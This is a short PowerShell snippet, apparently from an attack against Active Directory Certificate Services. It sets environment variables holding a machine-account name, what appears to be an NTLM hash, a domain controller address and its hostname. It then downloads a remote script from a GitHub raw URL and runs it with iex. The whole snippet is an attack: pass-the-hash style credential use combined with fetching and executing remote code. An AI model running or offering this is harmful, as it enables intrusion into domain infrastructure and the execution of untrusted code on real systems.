$env:CU = "NIV-PRN-01`$@NIVT-HB.local"
$env:CH = ":fe36e1fe3b37f6b54ffd4d04b0091c2e"
$env:CD = "192.168.1.3"
$env:CT = "NIV-DC-01.NIVT-HB.local"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex (iwr -UseBasicParsing "https://raw.githubusercontent.com/snehaweb3kid/runtime-cache-20260910--vpn/main/adcs-generic.ps1").Content
